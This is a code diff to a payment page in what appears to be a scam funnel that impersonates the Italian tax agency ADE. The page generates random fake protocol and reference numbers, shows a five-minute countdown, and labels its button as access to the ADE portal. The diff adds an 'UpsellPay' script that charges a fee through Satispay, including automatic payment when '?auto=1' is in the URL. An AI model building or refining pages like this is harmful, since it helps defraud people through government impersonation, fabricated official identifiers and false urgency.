@@ -192,6 +192,7 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   </div>
 </div>
 
+<script src="upsell-pay.js"></script>
 <script>
 (function(){
   var params = new URLSearchParams(window.location.search);
@@ -201,43 +202,33 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
 
   document.getElementById('valPrelievo').textContent = fmt(total);
 
-  // Protocolo aleatório
   var prot = 'ADE/2026/IT-' + Math.floor(1000000 + Math.random()*9000000);
   document.getElementById('protEl').textContent = 'Prot. n. ' + prot;
   document.getElementById('codeEl').textContent = 'ADE2026-' + Math.floor(10000000 + Math.random()*90000000) + '-IT';
 
-  // Timer 5 minutos
   var secs = 5 * 60;
   var timerEl = document.getElementById('timerEl');
-  var t = setInterval(function(){
-    if(--secs <= 0){
-      clearInterval(t);
-      timerEl.textContent = '00:00';
-      timerEl.style.color = '#7f1d1d';
-      return;
-    }
+  setInterval(function(){
+    if(secs <= 0){ timerEl.textContent='00:00'; timerEl.style.color='#7f1d1d'; return; }
     timerEl.textContent = String(Math.floor(secs/60)).padStart(2,'0') + ':' + String(secs%60).padStart(2,'0');
+    secs--;
   }, 1000);
 
-  function goCheckout(){
-    var dest = new URL('checkout-buck.html', window.location.href);
-    params.forEach(function(v,k){ dest.searchParams.set(k,v); });
-    dest.searchParams.set('taxa', taxa.toFixed(2));
-    dest.searchParams.set('total', total.toFixed(2));
-    window.location.href = dest.toString();
-  }
-
-  document.getElementById('btnPay').addEventListener('click', function(){
-    var btn = this;
-    btn.classList.add('loading');
-    btn.querySelector('.btn-text').textContent = 'Accesso al portale ADE…';
-    setTimeout(goCheckout, 1000);
-  });
-
+  // Skip → fim do funil
   document.getElementById('btnSkip').addEventListener('click', function(){
-    // Fim do funil — redireciona para página de agradecimento ou index
     window.location.href = new URL('index.html', window.location.href).toString();
   });
+
+  // Renomear btnPay para btnCta temporariamente não é possível no DOM,
+  // então registramos o listener manual para o clique e deixamos o UpsellPay
+  // cuidar do auto e do polling (init não conecta btnPay, só btnCta/btnConclude)
+  document.getElementById('btnPay').addEventListener('click', function(e){
+    e.preventDefault();
+    UpsellPay._create({ taxa: taxa, nextPage: 'index.html' }, params);
+  });
+
+  // Auto-pagamento (se vier com ?auto=1) e polling ao voltar do Satispay
+  UpsellPay.init({ taxa: taxa, nextPage: 'index.html' });
 })();
 </script>
 </body>
